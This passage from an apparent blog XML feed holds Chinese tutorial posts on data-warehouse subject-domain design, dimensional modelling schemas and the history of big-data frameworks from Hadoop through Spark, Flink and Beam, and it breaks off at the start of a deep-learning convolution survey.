        <content type="html"><![CDATA[<p>数据仓库主体域划分一直是个难题</p><a id="more"></a><p>因为数据仓库是面向主题的，所以主题域的划分显得很重要，因为主题域的确定也意味着数据的目的是干什么的。有关于主题划分的文章较少，阿里大数据之路这本书也没有单独的章节来讲主题域的划分，因为这个是需要对业务场景来说的，而且就算确定的业务场景也没有说百分百该如何划分，我还见过一群在互联网大数据领域有着多年工作经验的数仓专家们讨论某个表该划分到哪个主题域。所以，以下内容仅代表我在数仓主题域的一些拙见。</p><h2 id="什么是数据仓库主题域？"><a href="#什么是数据仓库主题域？" class="headerlink" title="什么是数据仓库主题域？"></a>什么是数据仓库主题域？</h2><p>主题域通常是联系较为紧密的数据主题的集合。可以根据业务的关注点，将这些数据主题划分到不同的主题域。主题域的确定必须由最终用户和数据仓库的设计人员共同完成。</p><h2 id="划分主题域方法"><a href="#划分主题域方法" class="headerlink" title="划分主题域方法"></a>划分主题域方法</h2><h3 id="传统方法"><a href="#传统方法" class="headerlink" title="传统方法"></a>传统方法</h3><p>在业务调研之后，可以进行主题域的划分。划分主题域，需要分析各个业务模块中有哪些业务活动。通常我们按照以下方法划分主题域，可以按照用户企业的部门划分，也可以按照业务过程或者业务板块中的功能模块划分。</p><ul><li>按照系统划分：业务系统有几种，就划分为几类</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20210801204402.png" srcset="/img/loading.gif" lazyload="" alt=""></p><ul><li>按业务划分：比如业务系统中有商品、交易、物流等过程，那这里的每一个过程就划分到一个主体域里。相对来说按业务划分主题域较常用。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20210801215033.png" srcset="/img/loading.gif" lazyload="" alt=""></p><ul><li>按部门规划：比如公司内的生产、供应链、研发、销售等</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20210801204847.png" srcset="/img/loading.gif" lazyload="" alt=""></p><h3 id="数据中台常用方法"><a href="#数据中台常用方法" class="headerlink" title="数据中台常用方法"></a>数据中台常用方法</h3><p>目前较多大型互联网公司都有建设数据中台，这种模式下较多按业务划分。这种除了具有一级主题域以外，每个一级主题域还有二级主题域。具体架构图如下：</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20210801214947.png" srcset="/img/loading.gif" lazyload="" alt=""></p><p>具体表现例子：</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20210801215726.png" srcset="/img/loading.gif" lazyload="" alt=""></p><p>当然，在实际的业务中每个一级域下的二级域也不会就这么两三个。</p><h2 id="主题域的核心"><a href="#主题域的核心" class="headerlink" title="主题域的核心"></a>主题域的核心</h2><p>为保障整个体系的生命力，主题域需要抽象提炼，并长期维护更新，但不轻易变动。划分数据域时，需满足以下两点：</p><ul><li>能涵盖当前所有的业务需求。</li><li>能在新业务进入时，无影响地被包含进已有的主题域中和扩展新的主题域。</li></ul><h2 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h2><h3 id="一次能划分好主题域吗"><a href="#一次能划分好主题域吗" class="headerlink" title="一次能划分好主题域吗"></a>一次能划分好主题域吗</h3><p>首先，主题域是无法一次划分完整的，一般是一次先建立几个明确的主题，在大多数数据仓库的设计过程中都有一个主题域的选择过程。业务是一直发展的，因此设计之初不要想着一次把所有主题全部划分完整。我们可以遵循上面说的划分主题域的两个要点，后续采用迭代的方式补充。</p><h3 id="划分为几个主题域合适"><a href="#划分为几个主题域合适" class="headerlink" title="划分为几个主题域合适"></a>划分为几个主题域合适</h3><p>主题域的个数由业务复杂度决定，但建议一级主题域在10个以内。</p><h3 id="感觉可以划分到多个主题域？"><a href="#感觉可以划分到多个主题域？" class="headerlink" title="感觉可以划分到多个主题域？"></a>感觉可以划分到多个主题域？</h3><p>表只能属于一个一级主题域，在一些比较模糊中的报表中，例如如果有一级数据域：商品域、订阅域，那商品中的订阅该划分到商品域还是订阅域？</p><p>这种比较容易让人接受的是以<strong>数据内容</strong>来划分域。不同的人有不同的看法，但是数据团队一定要制定统一的规范。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 数据仓库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数仓入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数仓基础概念</title>
      <link href="/2021/07/30/%E6%95%B0%E4%BB%93%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5/"/>
      <url>/2021/07/30/%E6%95%B0%E4%BB%93%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5/</url>
      
        <content type="html"><![CDATA[<p>了解数据仓库</p><a id="more"></a><h2 id="1-数据仓库的定义"><a href="#1-数据仓库的定义" class="headerlink" title="1. 数据仓库的定义"></a>1. 数据仓库的定义</h2><p><strong>问：什么是数据仓库?</strong></p><p>数据仓库面向主题（整个处理流程）、具有集成（数据整合）、随时间相对稳定、反映历史变化。</p><h2 id="2-事实表与维度表"><a href="#2-事实表与维度表" class="headerlink" title="2. 事实表与维度表"></a>2. 事实表与维度表</h2><p>维表是观察该事物的角度（维度），事实表是要关注的内容（结果）</p><ul><li><p>维度表的特点</p><p><strong>维度表的冗余很大</strong>，主要是维度一般不大（相对事实表来说），而维度表的冗余度可以使事实表节省很多空间。</p></li><li><p>事实表的特点</p><p>事实表一般都很大，如果以普通方式查询的话，得到结果所需要的时间很长。所以一般需要进行一些特殊处理（比如预生成处理）</p><p>事实表一般没有主键，维度表的主键一般都是整型（目的是节约事实表存储空间）</p></li></ul><h2 id="3-多维数据建模"><a href="#3-多维数据建模" class="headerlink" title="3. 多维数据建模"></a>3. 多维数据建模</h2><h3 id="3-1-星型模型"><a href="#3-1-星型模型" class="headerlink" title="3.1 星型模型"></a>3.1 星型模型</h3><p>星型模型主要由维表和事实表构成，<strong>以事实表为中心</strong>，所有维度直接关联在事实表上，呈星型分布。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/1OYP1AZw0W1UwPYvStthXYOIVIJMRPHg8cs4Mkghw3E3KRLbgSgMAT1PHibFQ5noseRpicmylmKp3gKPc0LMAyDg/640?wx_fmt=jpeg&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" srcset="/img/loading.gif" lazyload="" alt="图片"></p><p>图来源于Kimball《The Data Warehouse Toolkits -3rd Edition》</p><h3 id="3-2-雪花模型"><a href="#3-2-雪花模型" class="headerlink" title="3.2 雪花模型"></a>3.2 雪花模型</h3><p>雪花模型，在星型模型的基础上，维度表上又关联了其他维度表。</p><p>雪花模型的维护成本较高，性能方面也较差，尤其是基于hadoop体系构建数仓，减少join就是减少shuffle，性能差距会很大。</p><ul><li><p><strong>区分星型模型与雪花模型</strong></p><p>与星型模型的区别：主要在维度，标准的星型模型维度只有一层，而雪花模型的维度会涉及多级，如图：</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20210801230325.png" srcset="/img/loading.gif" lazyload="" alt="星型模型与雪花模型"></p><ul><li><strong>星型模型和雪花模型的优劣对比</strong></li></ul><table><thead><tr><th align="left">属性</th><th align="left">星型模型</th><th align="left">雪花模型</th></tr></thead><tbody><tr><td align="left">数据总量</td><td align="left">多</td><td align="left">少</td></tr><tr><td align="left">可读性</td><td align="left">容易</td><td align="left">差</td></tr><tr><td align="left">表个数</td><td align="left">少</td><td align="left">多</td></tr><tr><td align="left">查询速度</td><td align="left">快</td><td align="left">慢</td></tr><tr><td align="left">冗余度</td><td align="left">高</td><td align="left">低</td></tr><tr><td align="left">对实时表的情况</td><td align="left">增加宽度</td><td align="left">字段比较少，冗余底</td></tr><tr><td align="left">扩展性</td><td align="left">差</td><td align="left">好</td></tr></tbody></table><ul><li><p>应用场景</p><p><strong>星型模型</strong>的设计方式主要带来的好处是能够提升查询效率，因为生成的事实表已经经过预处理，主要的数据都在事实表里面，所以只要扫描实时表就能够进行大量的查询，而不必进行大量的join，其次维表数据一般比较少，在join可直接放入内存进行join以提升效率，除此之外，星型模型的事实表可读性比较好，不用关联多个表就能获取大部分核心信息，设计维护相对比较简答。</p><p><strong>雪花模型</strong>的设计方式是比较符合数据库范式（比较靠近3NF，但无法完全遵守，因为完全遵循3NF的性能成本太高）的理念，设计方式比较正规，数据冗余少，但在查询的时候可能需要join多张表从而导致查询效率下降，此外规范化操作在后期维护比较复杂。</p></li></ul><h3 id="3-3-星座模型"><a href="#3-3-星座模型" class="headerlink" title="3.3 星座模型"></a>3.3 星座模型</h3><p>星座模型，是对星型模型的扩展延伸，多张事实表共享维度表。数仓模型建设后期，大部分维度建模都是星座模型。</p><p>星座模型与前两种的区别是<strong>事实表的数量</strong>，星座模型有多个事实表。</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20210801234858.png" srcset="/img/loading.gif" lazyload="" alt=""></p><h2 id="4-数据仓库和数据库的区别？"><a href="#4-数据仓库和数据库的区别？" class="headerlink" title="4.数据仓库和数据库的区别？"></a>4.数据仓库和数据库的区别？</h2><ul><li><p>数据库是面向事务的，数据由日常业务产生，常更新</p><p>数据仓库是面向主题的，数据来源于数据库或文件，经过一定的规则转换得到，用于分析决策</p></li><li><p>数据库一般是存储<strong>当前</strong>数据的</p><p>数据仓库一般存储的是<strong>历史</strong>数据</p></li><li><p>数据库的设计一般要符合三范式，有最大精确度和最小冗余度，有利于数据的插入</p><p>数据仓库的设计一般是按照数仓建模规范，有一定的冗余，有利于查询</p></li></ul><h2 id="5-数据仓库建模5步法"><a href="#5-数据仓库建模5步法" class="headerlink" title="5.数据仓库建模5步法"></a>5.数据仓库建模5步法</h2><ol><li><p>确定主题（目标是什么）</p><p>即确定数据分析或前端展示的主题（例如：某年某月某地区的啤酒销售情况）。</p><p>主要体现出某一方面的分析角度（维度）和统计数值型数据（指标）之间的关系。</p><p>确定主题时要综合考虑。</p></li><li><p>确定数据指标（度量单位）</p><p>确定主题后，要考虑分析的数据指标（例如年销售额等）。数据指标是要统计的指标，必须事先选择恰当。（如果条件允许，则依托一套元数据管理会做得更好）</p></li><li><p>确定事实数据粒度（最小研究单位）</p><p>确定数据指标之后，需要考虑该指标的汇总情况和不同维度下指标的聚合情况。例如在业务系统中数据最小记录到秒，而在数仓建设需求中，时间可能只需要精确到天就可以了。</p></li><li><p>确定维度（分析的角度）</p><p>维度是分析的各个角度，例如：我们希望按照时间、地区、产品进行分析，那么这里的时间、地区、产品就是维度。基于不同的维度，可以看到各种数据指标的汇总情况，也可以基于所有维度进行交叉分析（这里的所有维度是指模型中列入的维度）。</p></li><li><p>创建事实表（结果表）</p><p>在确定好实时数据和维度后，将考虑加载事实表。业务系统中的一条条订单、交易数据就是将要简历的事实表的原始数据（原始表）。通常是将原始表与维度表进行关联，生成事实表。</p></li></ol><h2 id="6-数仓专业术语"><a href="#6-数仓专业术语" class="headerlink" title="6. 数仓专业术语"></a>6. 数仓专业术语</h2><h3 id="ETL"><a href="#ETL" class="headerlink" title="ETL"></a>ETL</h3><p>ETL（Extract-Transform-Load）是指将业务系统中的数据进行<strong>抽取、转换、加载</strong>到数据仓库的过程，目的是将企业中分散、零乱、标准不统一的数据整合到一起，为企业的决策提供分析的依据。</p><h3 id="OLAP"><a href="#OLAP" class="headerlink" title="OLAP"></a>OLAP</h3><p>联机分析处理（Online analytical processing，OLAP），从数据仓库中抽取详细数据的一个子集并经过必要的聚集，存储到OLAP存储器中供前端分析工具读取。</p><h3 id="OLTP"><a href="#OLTP" class="headerlink" title="OLTP"></a>OLTP</h3><p>联机(在线)事务处理(On-Line Transaction Processing，OLTP)，主要是执行日常的事务处理，比如数据库记录的增删改查。OLTP的特点一般有：实时性要求高，数据量不大，高并发，并且要求满足ACID原则。</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 数据仓库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数仓入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大数据技术的演变：计算框架</title>
      <link href="/2021/06/07/%E5%A4%A7%E6%95%B0%E6%8D%AE%E6%8A%80%E6%9C%AF%E7%9A%84%E6%BC%94%E5%8F%98%EF%BC%9A%E8%AE%A1%E7%AE%97%E6%A1%86%E6%9E%B6/"/>
      <url>/2021/06/07/%E5%A4%A7%E6%95%B0%E6%8D%AE%E6%8A%80%E6%9C%AF%E7%9A%84%E6%BC%94%E5%8F%98%EF%BC%9A%E8%AE%A1%E7%AE%97%E6%A1%86%E6%9E%B6/</url>
      
        <content type="html"><![CDATA[<p>从计算框架的角度来看大数据技术18年来的变化</p><a id="more"></a><h2 id="开篇语"><a href="#开篇语" class="headerlink" title="开篇语"></a>开篇语</h2><p>大数据技术最早源自于Google，主要是因为Google需要面对的数据量太大了（2003年的时候Google就已经有几百亿的搜索量了）。为了省去重复造轮子节省劳动成本，Google内部以及工业界都亟须一套工具来处理大规模的数据。</p><p>接下来，将从大数据计算框架的演变来观看大数据技术的前世今生。</p><h2 id="Hadoop"><a href="#Hadoop" class="headerlink" title="Hadoop"></a>Hadoop</h2><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/hadoop-logo.jpg" srcset="/img/loading.gif" lazyload="" alt=""></p><p>2003 年，Google工程师Jeffrey Dean等人的论文《MapReduce: Simplified Data Processing on Large Clusters》的发表标志着大数据技术的来临。</p><p>MapReduce是Hadoop的计算框架（Hadoop1.x主要由用于存储的分布式文件系统<code>HDFS</code>和计算框架<code>MapReduce</code>组成），MapReduce的逻辑较为简单（思想是较简单，但操作就复杂了），其思想为分而治之，主要分为<code>Map</code>和<code>Reduce</code>两个阶段。</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/s5KOH2nhNXTZ6wl.png" srcset="/img/loading.gif" lazyload="" alt=""></p><p>而Hadoop 1.x中的存储则由HDFS（分布式文件系统）完成</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/image-20210411110426377.png" srcset="/img/loading.gif" lazyload="" width="50%"></p><p>为了统一管理分布式系统中的资源，Hadoop 2.x版本中增加了一个重要模块——<code>yarn</code>。yarn是一个资源管理器，其作用是在Hadoop集群（Hadoop任务）中分配资源（内存、CPU等），故Hadoop 2.x版本的架构是这样的：</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/image-20210411110708380.png" srcset="/img/loading.gif" lazyload="" width="50%"></p><p>此外，伴随着Hadoop诞生的还有HBase（分布式数据库）、Hive（数据仓库工具，提供类似SQL的接口）、Sqoop（数据同步工具）、Ooize（作业调度系统）</p><p>在这里逐一介绍一个各个组件的作业：</p><ul><li><p>Hive</p><p>Hive主要解决<strong>“存储和计算问题”</strong>（海量数据的三大问题为：“传输问题，存储问题，计算问题”）</p><p>Hive存储的数据是在HDFS上的，但它可以将分布式的数据文件映射为一张表，并提供类SQL的查询功能（简称Hive-SQL，也简称HQL）。</p><p>Hive的本质是<strong>“将SQL转换成MapReduce程序”</strong>（MapReduce写起来很麻烦，现在几乎没人写了，想象一下写汇编语言）</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/image-20210411112518503.png" srcset="/img/loading.gif" lazyload="" width="50%"></p><ul><li><p>HBase</p><p>HBase是一个高可靠性、高性能、面向列、可伸缩的分布式存储系统</p><p>（注意一个是文件系统，一个是数据库。可以说HBase跟HDFS没什么关系，只是文件系统是通过HDFS来支持的）</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/image-20210411113038717.png" srcset="/img/loading.gif" lazyload="" width="50%"></p><ul><li><p>Sqoop</p><p>Sqoop可将多种数据库的数据导入到HDFS中，也可以在HDFS上的数据导出到数据库。</p><p>在大数据应用的业务场景中，数据通常来源于多个不同的数据库，比如<code>MySQL</code>、<code>Ti-DB</code>、<code>Redis</code>，而每种数据库的存储格式又是不一样的，所以在使用时需要对这些数据进行一个规范化操作。与Sqoop类似的数据同步框架有阿里开发的<code>DataX</code>，为了便于理解，在此只讲解DataX架构图。</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20210606012050.png" srcset="/img/loading.gif" lazyload="" alt="DataX数据同步原理图"></p><p>上图中左侧可以看出，多种数据源之间转换是较为复杂的；DataX将源自MySQL、Oracle的数据转换为统一的格式，再将该格式转换为目标格式（如上图右侧部分）。</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/2dZ9A1eXsmghtSR.png" srcset="/img/loading.gif" lazyload="" alt="DataX工作流程图"></p></li><li><p>Ooize</p><p>Ooize是一个调度系统。Linux系统也有自带的调度系统<code>crontab</code>，crontab可以实现定时触发某个程序（任务）。但是仅仅定时触发某个程序是远远无法满足业务需求的，因为在实际的大数据业务场景中，还会涉及有<code>依赖项</code>的作业，举个栗子：</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20210606012147.png" srcset="/img/loading.gif" lazyload="" width="50%"></p><p>定时作业启动后分别得到作业1和作业2，而实际应用中我们需要当作业1和作业2都有数据之后触发作业3（这种情况称作业1和作业2是作业3的上游依赖项），那么这种情况crontab是很难完成的，因而需要Ooize。</p></li><li><p>Flume</p><p>Flume是一个<code>高可用</code>的分布式的海量日志采集、聚合和传输的系统。对于数据库来说，日志代表着操作，故日志采集系统一定要有高可用性（High Availability）。</p></li><li><p>Zookeeper</p><p>ZooKeeper是一个分布式的应用程序协调服务。因为大数据框架中各种组件多，Zookeeper的作用即是保证<code>事务一致性</code>。</p></li></ul><p>还有许多形形色色的大数据组件，但是这里仅仅讲解一些目前（2021年）较常用的大数据框架及组件（其中MapReduce也已经被淘汰了，但是作为大数据时代三驾马车之一，其影响较大，故还是需要学习一下）</p><p>Hadoop时代的大数据框架架构大概如图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20210606012322.png" srcset="/img/loading.gif" lazyload="" alt="Hadoop时代大数据架构"></p><h2 id="Spark"><a href="#Spark" class="headerlink" title="Spark"></a>Spark</h2><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20210606012351.png" srcset="/img/loading.gif" lazyload="" width="30%"></p><p><strong>MapReduce存在的问题</strong></p><p>MapReduce作为最早的大数据计算框架，有着规范的批处理流程，但是太慢了，谷歌在十几年前尝试着优化，但是花费了五年时间效率也仅仅提升了百分之几，在性能方面已几乎达到了瓶颈；此外，由于MapReduce只提供Map和Reduce两种操作，故完成一项大数据相关任务往往需要多个MapReduce子任务，多个子MapReduce需要一个接一个执行从而形成一条链路，而链路中只要有一个MapReduce出错或者失败就会影响整个任务，这种情况使得大数据在业务场景中的应用受到很大的限制。</p><p>企业需要相对较快且对较高开发效率且稳定的大数据处理技术，而Spark恰巧满足了这种需求。</p><p><strong>新一代大数据计算框架</strong></p><p>Spark是一个基于内存计算技术的大数据计算框架，其<code>微批处理</code>（即把不同时间段的数据当作多个小块数据来处理）可以实现准实时计算。Spark的核心功能是RDD（弹性分布式数据集，即RDD只记录每一份数据集分别在哪台服务器节点等配置信息从而使得RDD像是一个分布式的数据集），RDD有着map、reduce在内的数十种操作，相比MapReduce，Spark在针对业务场景中简单易用。</p><p>大多数情况下，Spark的速度是Hadoop的数倍甚至上百倍（Spark的启动引擎较慢，所以在处理小规模的数据时比MapReduce、Hive快得不多甚至更慢）。从运行逻辑斯蒂回归算法在Spark 和 Hadoop 所需时间对比（x轴是迭代次数）：</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20210606104325.png" srcset="/img/loading.gif" lazyload="" width="50%"></p><p>此外，Hadoop这种需要多次读写入硬盘的模式并不适合机器学习算法这类需要迭代的计算（读写硬盘会需要较长的时间），而Spark直接在内存中计算故并不会有这类问题，在2013年之后国内的一线互联网公司基本上都采用Spark了。</p><p>此外Spark也提供了Spark ML（机器学习），Spark SQL（类似SQL的操作接口），Spark Streaming（实时处理）等模块</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20210606012531.png" srcset="/img/loading.gif" lazyload="" alt="Spark模块"></p><p>Spark即支持<code>批处理</code>又支持<code>流处理</code>，此外在架构设计上的优越注定会在性能、业务适应等多方面完爆MapReduce（事实上，MapReduce早就被国内外的一线互联网公司淘汰了，有兴趣的读者可以看看Google Brain资深工程师蔡元楠老师的<a href="https://link.zhihu.com/?target=https%3A//time.geekbang.org/column/article/90081%3Futm_term%3DzeusL8H4I%26utm_source%3Dzhihu%26utm_medium%3Djikeshijian%26utm_campaign%3D167-presell%26utm_content%3D0417bannerlink">为什么MapReduce会被硅谷一线公司淘汰？</a>）</p><p>在Spark中执行流程是这样的：</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20210606012557.png" srcset="/img/loading.gif" lazyload="" width="50%"></p><p>其中<code>DataFrame</code>和<code>Dataset</code>是Spark的两种数据类型（SQL、DataFrame、Dataset都是RDD的上层接口），可以用Scala、Java、python、R编写（其中Dataset是不支持Python和R语言的，并且性能以及功能支持上这几门编程语言在Spark的性能上依次递减，即Spark对Scala支持最好，对R支持最差，Java编写的Spark代码运行速度是Python的10倍左右）</p><p>此时，大数据技术在常见的业务应用中的架构图是这样的：</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20210606012654.jpg" srcset="/img/loading.gif" lazyload="" alt="批处理与流处理在业务中的应用"></p><ul><li><p>kafka</p><p>这里说一下<code>Kafka</code>，一种<code>高吞吐量</code>的分布式发布订阅消息系统（MQ系统），其在众多消息系统中一枝独秀（高吞吐量，想象一下排队，人数一定的情况下是不是进得快出得快体验更佳）。Kafka在数据的实时计算中有着重要的作用。</p></li></ul><h2 id="Flink"><a href="#Flink" class="headerlink" title="Flink"></a>Flink</h2><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20210606012840.png" srcset="/img/loading.gif" lazyload="" width="30%"></p><p>Spark中的实时计算模块是Spark Streaming（现在Spark在流处理方面都用<code>Structured Streaming</code>了），严格来说，这只是准实时（近实时）计算，其延迟是在<code>1分钟</code>以内。Spark微批处理的思想使得其有相比MapReduce有较快的速度，因而在批处理（离线计算）和流处理（实时计算）方面都有着良好的效果，但是这种设计也限制了Spark在实时处理方面的发展。而在一些业务场景中需要更快速的处理数据（例如金融、支付等），经过多年的发展，Flink在众多实时计算框架中脱颖而出（最早的实时计算框架Storm也很少见了）。</p><p>Flink在官网上是这样写的： Stateful Computations over Data Streams（数据流上的有状态计算），显然Flink中最重要的一个概念是<code>State</code>(状态)，这种设计天然符合无边界数据的处理（无边界数据是指持续增长的数据）。Flink的设计思想使得Flink可以达到实时计算要求，延迟在<code>毫秒级</code>（即1秒钟以内）。到2021年的今天，Flink已经被应用在国内的众多知名互联网公司。</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20210606012939.png" srcset="/img/loading.gif" lazyload="" alt="Flink执行流程"></p><p>Flink有着与Spark相似的一些概念，例如也有Flink ML（机器学习）、Dataset、Datastream（像不像Spark Streaming）</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20210606013021.png" srcset="/img/loading.gif" lazyload="" alt="Flink模块"></p><h2 id="Beam"><a href="#Beam" class="headerlink" title="Beam"></a>Beam</h2><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20210606013115.png" srcset="/img/loading.gif" lazyload="" alt=""></p><p>在业务场景中，批处理与流处理混用是很常见的，批处理与流处理统一框架Beam应运而生。在此前，批处理和流处理往往需要两套计算框架，例如本文Spark部分的最后一张图中，Hadoop（这里的Hadoop通常是指MapReduce）与Spark Streaming并存（现在大部分公司是Spark+Flink了。尽管Flink号称批流统一，但相比微批处理，实时计算是被认为不稳定的）。</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20210606013517.jpeg" srcset="/img/loading.gif" lazyload="" alt=""></p><p>那么这种情况下往往需要对离线和实时作业都进行相应的开发，这个过程会涉及数据平台、数据服务、数据仓库、运维等多个开发团队，消耗的人力成本是巨大的。基于Beam开发的数据处理程序可以执行在已经支持的任意分布式计算引擎上（目前Spark、Flink、Dataflow、samza、twister2都已经支持，对storm的支持在开发中），如图：</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20210606013249.png" srcset="/img/loading.gif" lazyload="" width="50%"></p><p><strong>Beam不是计算框架</strong>，但仍然出现在这一篇文章里，因为Beam与计算框架密切相关。Beam最重要的是编程模型思想，Beam中有着大量的抽象封装，例如<strong>PCollection</strong>（PCollection 是无序且没有固定边界的）、PValue、Transform。Beam的设计思想相对较为复杂，但绝不是多余的（试想RDD相比MapReduce也较为复杂，但如果不这样设计怎么满足得了各种复杂的业务需求呢）。</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20210606013341.png" srcset="/img/loading.gif" lazyload="" alt=""></p><p>大数据框架及组件自2003年出现以来就不断迭代变化，经历了从批处理（Hadoop）到微批处理（Spark），再到流处理（Flink）。</p><p>在2003年，大数据框架首选肯定是Hadoop（因为当时也只有Hadoop）。</p><p>但是，在2009年Spark开源后（尤其是已经在业界论证了Spark性能在Hadoop之上时），面临着继续使用Hadoop和使用Spark的两种选择。作为一个新人，当然是只是需要花少量时间在Hadoop上，而主要学习Spark。</p><p>但对于已有成熟的大数据业务及应用的互联网公司开发人员，如果继续使用Hadoop则意味着需要忍受在开发维护上麻烦较多且性能不佳，如果选择使用Spark则意味着需要进行大规模的技术栈迁移（想象一下既要工作又要学习新技术）。</p><p>而到了2014年Flink出现的时候呢？还是面临着类似的选择。</p><p>但如果一开始就有 Beam ，或许就不必有这个烦恼了。（但目前国内外互联网公司和社区的情况来看，Apache Beam已经扑街了）</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>大数据框架经过18年的演变有着较大的变化，对于大数据技术从业者来说，仍然需要不断学习充电。那么，当面临新的一代大数据框架，你会怎么做呢？</p><p>“拥抱变化”——Jack马（作者：我信你个鬼，我选择躺平）</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 大数据技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hadoop </tag>
            
            <tag> Spark </tag>
            
            <tag> Flink </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深度学习卷积概述</title>
      <link href="/2021/05/22/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E5%8D%B7%E7%A7%AF%E6%A6%82%E8%BF%B0/"/>
      <url>/2021/05/22/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E5%8D%B7%E7%A7%AF%E6%A6%82%E8%BF%B0/</url>
      
        <content type="html"><![CDATA[<p>就硬卷…</p><a id="more"></a><h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>深度学习是机器学习和人工智能研究的最新且最热门的趋势之一。深度学习方法为计算机视觉带来了革命性的进步，新的深度学习理论和技术正在不断诞生，在计算机视觉领域超越传统的机器学习甚至是现有的深度学习方法。近年来，有关深度学习方面的研究成果爆炸式地增长，由于其发展迅猛，导致了它的进展很难被新的研究者入手并跟进。此外，深度学习已有的方法数量上过于庞大，种类上过于繁多，虽然有大量的深度学习综述为研究者提供现有的研究发展情况，但是其往往是全面地介绍整个深度学习方法。因而，本文将着重于计算机视觉领域，从深度学习方法中的图像采样对深度学习展开叙述。</p><h2 id="1-序言"><a href="#1-序言" class="headerlink" title="1.序言"></a>1.序言</h2><p>深度学习（DeepLearning，DL）被认为是机器学习（Machine Learning ，ML）子领域，其采用多层次的非线性信息处理和抽象，用于有监督、无监督、半监督、自监督、弱监督等的特征学习、表示、分类、回归和模式识别等[1-01]。在 2000 年时深度学习的方法被用于人工神经网络（ANN），随着层数的加深，人工神经网络的被单独提出深层神经网络（DNN）这一分支。在2012年 ImageNet大规模视觉识别挑战赛上卷积神经网络AlexNet获得冠军，并且误判率令人惊艳[1-02]，从此卷积神经网络受到众多研究者的瞩目，并促使了深度学习的快速发展，目前计算机视觉（CV）领域多使用卷积神经网络，并且神经网络深度逐渐加深[1-03]。在自然语言处理（NLP）领域，由于循环神经网络（RNN）结构使得其较适合处理文本分析等场景从而受到众多研究者的欢迎。生成对抗网络以零和博弈的思想依赖生成模型和判别模型使得在图像生成方面效果良好。此外，较为常用的深度学习方法还有自编码器[1-04]、胶囊网络[1-05]、属于循环神经网络的长短记忆网络[1-06]、增强神经网络、深度信念网络、 